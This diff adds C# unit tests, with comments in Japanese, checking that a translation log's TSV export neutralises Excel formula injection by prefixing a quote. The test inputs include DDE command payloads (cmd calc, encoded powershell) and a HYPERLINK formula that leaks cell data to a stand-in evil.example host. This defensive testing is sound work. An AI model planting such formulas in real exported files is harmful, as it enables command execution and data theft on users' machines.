@@ -156,4 +156,94 @@ public class TranslationLogEntryTests
         Assert.AreEqual(string.Empty, entry.ProcessName);
         Assert.AreEqual("just text", entry.Text);
     }
+
+    // ═══════════════════════════════════════════════════════════════
+    // Excel CSV インジェクション対策 (CWE-1236、 /rere #A2-001 / #A2-002)
+    // ═══════════════════════════════════════════════════════════════
+    //
+    // 攻撃シナリオ: 翻訳テキスト or ProcessName が「=」「+」「-」「@」で始まる場合、
+    // ユーザーが TSV ログを Excel で開いた瞬間に数式 / DDE / HYPERLINK が発火する。
+    // OWASP 推奨パターン: 先頭に `'` (シングルクォート) を付与して数式評価を抑止する。
+
+    [TestMethod]
+    [TestCategory("CsvInjection")]
+    public void ToTsvLine_TextStartsWithEquals_PrefixesQuote()
+    {
+        var entry = new TranslationLogEntry(SampleTime, "ja", "s1", "Chrome", "=cmd|'/C calc'!A0");
+        var line = entry.ToTsvLine();
+        Assert.IsTrue(line.EndsWith("\t'=cmd|'/C calc'!A0"), $"先頭の '=' に対して ' が付与されるはず: {line}");
+    }
+
+    [TestMethod]
+    [TestCategory("CsvInjection")]
+    public void ToTsvLine_TextStartsWithPlus_PrefixesQuote()
+    {
+        var entry = new TranslationLogEntry(SampleTime, "ja", "s1", "Chrome", "+SUM(1,2)");
+        var line = entry.ToTsvLine();
+        Assert.IsTrue(line.EndsWith("\t'+SUM(1,2)"), $"先頭の '+' に対して ' が付与されるはず: {line}");
+    }
+
+    [TestMethod]
+    [TestCategory("CsvInjection")]
+    public void ToTsvLine_TextStartsWithMinus_PrefixesQuote()
+    {
+        var entry = new TranslationLogEntry(SampleTime, "ja", "s1", "Chrome", "-1+1");
+        var line = entry.ToTsvLine();
+        Assert.IsTrue(line.EndsWith("\t'-1+1"), $"先頭の '-' に対して ' が付与されるはず: {line}");
+    }
+
+    [TestMethod]
+    [TestCategory("CsvInjection")]
+    public void ToTsvLine_TextStartsWithAt_PrefixesQuote()
+    {
+        var entry = new TranslationLogEntry(SampleTime, "ja", "s1", "Chrome", "@DDEAUTO");
+        var line = entry.ToTsvLine();
+        Assert.IsTrue(line.EndsWith("\t'@DDEAUTO"), $"先頭の '@' に対して ' が付与されるはず: {line}");
+    }
+
+    [TestMethod]
+    [TestCategory("CsvInjection")]
+    public void ToTsvLine_TextStartsWithSafeChar_NoQuote()
+    {
+        // 通常の翻訳テキストは prefix `'` を付けない (UI 表示・通常運用への影響なし)
+        var entry = new TranslationLogEntry(SampleTime, "ja", "s1", "Chrome", "こんにちは。");
+        var line = entry.ToTsvLine();
+        Assert.IsTrue(line.EndsWith("\tこんにちは。"), $"安全な文字で始まる場合は変更しない: {line}");
+    }
+
+    [TestMethod]
+    [TestCategory("CsvInjection")]
+    public void ToTsvLine_ProcessNameStartsWithEquals_AlsoPrefixed()
+    {
+        // #A2-002: ProcessName (FileVersionInfo.ProductName) は攻撃者制御可能
+        // (悪意ある MOD exe が ProductName に「=HYPERLINK(...)」を設定可能)
+        var entry = new TranslationLogEntry(SampleTime, "ja", "s1", "=HYPERLINK(\"http://evil\",X)", "ok");
+        var line = entry.ToTsvLine();
+        Assert.IsTrue(line.Contains("\t'=HYPERLINK(\"http://evil\",X)\t"),
+            $"ProcessName の先頭 '=' にも ' が付与されるはず: {line}");
+    }
+
+    [TestMethod]
+    [TestCategory("CsvInjection")]
+    public void ToTsvLine_HyperlinkAttack_NeutralizedWithQuote()
+    {
+        // 実際の攻撃ペイロード例
+        var entry = new TranslationLogEntry(SampleTime, "ja", "s1", "Chrome",
+            "=HYPERLINK(\"http://evil.example/?leak=\"&A1,\"クリック\")");
+        var line = entry.ToTsvLine();
+        Assert.IsTrue(line.Contains("\t'=HYPERLINK("),
+            $"HYPERLINK 攻撃ペイロードは ' で無害化されるはず: {line}");
+    }
+
+    [TestMethod]
+    [TestCategory("CsvInjection")]
+    public void ToTsvLine_CmdInjection_NeutralizedWithQuote()
+    {
+        // DDE 攻撃 (Office 旧バージョン)
+        var entry = new TranslationLogEntry(SampleTime, "ja", "s1", "Chrome",
+            "=cmd|'/C powershell -enc Z'!A1");
+        var line = entry.ToTsvLine();
+        Assert.IsTrue(line.Contains("\t'=cmd|"),
+            $"DDE 攻撃ペイロードは ' で無害化されるはず: {line}");
+    }
 }
